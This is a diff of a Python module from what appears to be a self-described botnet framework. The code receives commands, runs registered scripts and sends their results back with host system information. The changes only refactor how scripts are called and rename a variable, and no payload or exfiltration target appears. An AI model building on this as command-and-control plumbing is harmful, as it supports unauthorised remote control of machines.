@@ -1,11 +1,13 @@
 """"""
 from typing import Dict, List, Optional, TYPE_CHECKING
 from functools import wraps
+
+import platform
 import datetime
 import logging
+import inspect 
 import uuid
 import time
-import platform
 import os
 
 from .request import Request as Request
@@ -161,7 +163,6 @@ Docs: {__github_link__}
     def _create_request(self, command: List, meta_data: Dict) -> Request:
         request = Request()
         request.engine = self.engine
-        request.botnet_instance = self
         request.command = command
         request.meta_data = meta_data
         request.sytsem_data = self.system_info()
@@ -232,17 +233,20 @@ Docs: {__github_link__}
                 )
 
                 try:
-                    ret = script(request, *command)
+                    if len(inspect.signature(script).parameters) > 0:
+                        script_result = script(request)
+                    else:
+                        script_result = script()
 
                 except UserException as e:
-                    ret = e
+                    script_result = e
 
                 except Exception as e:
-                    ret = f"internal error \n\n{e}"
+                    script_result = f"internal error \n\n{e}"
 
                 finally:
-                    if not ret == None:
-                        self.engine.send(ret, additionalـinfo=self.system_info(minimal=True))
+                    if not script_result == None:
+                        self.engine.send(script_result, additionalـinfo=self.system_info(minimal=True))
                     time.sleep(self.delay)
 
             else:
